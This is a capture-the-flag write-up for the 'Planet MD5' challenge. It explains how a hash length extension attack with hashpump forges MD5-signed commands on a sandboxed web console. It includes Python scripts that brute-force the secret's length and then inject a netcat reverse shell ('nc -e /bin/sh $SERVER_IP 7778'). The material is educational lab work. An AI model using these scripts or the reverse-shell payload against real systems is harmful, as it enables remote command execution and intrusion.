### 0x01 Challenge:

**Description:**

>**Planet MD5**
>
>Escape the sandbox and read the flag.
>http://planet-md5.nn9ed.ka0labs.org.
>author: ka0labs

### 0x02 Write-up:

We start by visiting the URL provided.

![Branching](https://i.imgur.com/Ao2pJ8H.png)

As we can see, we have access to a console, which seems to only accept the execution of three commands:

```
telnetd> help
Help:
 - ls
 - id
 - uname
```

If we check the request made when executing a command, we can see that each one has an associated signature.

<img src="https://i.imgur.com/czT5ETO.png" width=800 height=200>

After hours of searching for exploitation options, hash break attempts and so on, I found this vulnerability.

---

**Hash Lenght Extension Attack**

In cryptography and computer security, a length extension attack is a type of attack where an attacker can use Hash(message1) and the length of message1 to calculate Hash(message1 ‖ message2) for an attacker-controlled message2, without needing to know the content of message1. Algorithms like MD5, SHA-1, and SHA-2 that are based on the Merkle–Damgård construction are susceptible to this kind of attack.

---

It completely matched what we needed to do, so I looked for some tool and set about it. In this case I used [Hashpump](https://github.com/bwall/HashPump).

The first use we are going to give the tool is to achieve the key length. For this case I did the following script:

```python
import requests
from subprocess import check_output
import re

originalSig = 'f55f774913a6e4ad3691f217c60c0958'
cmd = "hashpump -s '" + originalSig + "' --data 'command=id' -a '|ls' -k "

for x in range(1, 60):
    # Append the key length to the command and get the output from execution
    ncmd = cmd + str(x)
    out = check_output(ncmd, shell=True).split("\n")

    newParams = out[1].strip()
    newSig = out[0].strip()

    # URL encode the padding
    m = re.search(r"id(.+?)ls", newParams)
    items = m.group(1).split('\\')
    for item in items:
        newParams = newParams.replace('\\x'+item, '%'+item)

    viewUrl = 'http://planet-md5.nn9ed.ka0labs.org/index.php?' + newParams + '&signature=' +newSig

    r = requests.get(viewUrl)
    if r.text.strip() == 'index.php':
        print 'New URL params: ' + newParams
        print 'New full URL:   ' + viewUrl
        print 'Key length:     ' + str(x) + ' -> ' + r.text.strip()
```

The use of it is to let us know when we have managed to execute the 'ls' command attached to the 'id' command itself. So when it finds an 'index.php' file it notifies us with the complete URL and the key length as we see in the following image.

![Branching](https://i.imgur.com/8rmdyhj.png)

Visiting the full URL we see the 'ls' command execution achieved.

![Branching](https://i.imgur.com/bodn1pZ.png)

Seeing that it is vulnerable and knowing the length of the key, I modify the script to throw a reverse shell on a server.

```python
import requests
from subprocess import check_output
import re

originalSig = 'f55f774913a6e4ad3691f217c60c0958'
cmd = "hashpump -s '" + originalSig + "' --data 'command=id' -a '| nc -e /bin/sh $SERVER_IP 7778' -k "

# Append the key length to the command and get the output from execution
x = 15
ncmd = cmd + str(x)
out = check_output(ncmd, shell=True).split("\n")

newParams = out[1].strip()
newSig = out[0].strip()

# URL encode the padding
m = re.search(r"id(.+?)7778", newParams)
items = m.group(1).split('\\')
for item in items:
    newParams = newParams.replace('\\x'+item, '%'+item)

viewUrl = 'http://planet-md5.nn9ed.ka0labs.org/index.php?' + newParams + '&signature=' +newSig

r = requests.get(viewUrl)
print 'New URL params: ' + newParams
print 'New full URL:   ' + viewUrl
print 'Key length:     ' + str(x)
```

We execute it, we visit the complete URL that it gives us and we verify that we receive reverse shell on our server.

![Branching](https://i.imgur.com/vCWLrl6.png)

![Branching](https://i.imgur.com/pbgwWff.png)

Finally we have shell on the server. It would only be to find the flag and that's it.

![Branching](https://i.imgur.com/waZW6iu.png)

`Flag: nn9ed{j3t_ext3nd3r_4d}`
